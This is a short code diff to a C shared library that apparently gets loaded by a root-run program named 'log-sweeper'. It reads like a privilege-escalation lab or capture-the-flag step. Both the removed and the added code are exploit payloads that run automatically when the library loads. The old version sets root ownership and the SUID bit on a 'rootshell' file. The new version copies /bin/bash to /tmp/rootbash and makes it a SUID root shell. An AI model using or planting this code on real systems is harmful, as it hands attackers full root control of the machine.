@@ -1,13 +1,6 @@
-#include <stdio.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-#include <unistd.h>
+#include <stdlib.h>
 
-#define ROOTSHELL "/usr/local/lib/dev/rootshell"
-
-/* Runs automatically when log-sweeper loads this library (as root). */
 __attribute__((constructor))
 void init(void) {
-    chown(ROOTSHELL, 0, 0);       /* set owner/group to root (uid 0, gid 0) */
-    chmod(ROOTSHELL, 04755);      /* SUID + rwxr-xr-x */
+    system("cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4755 /tmp/rootbash");
 }
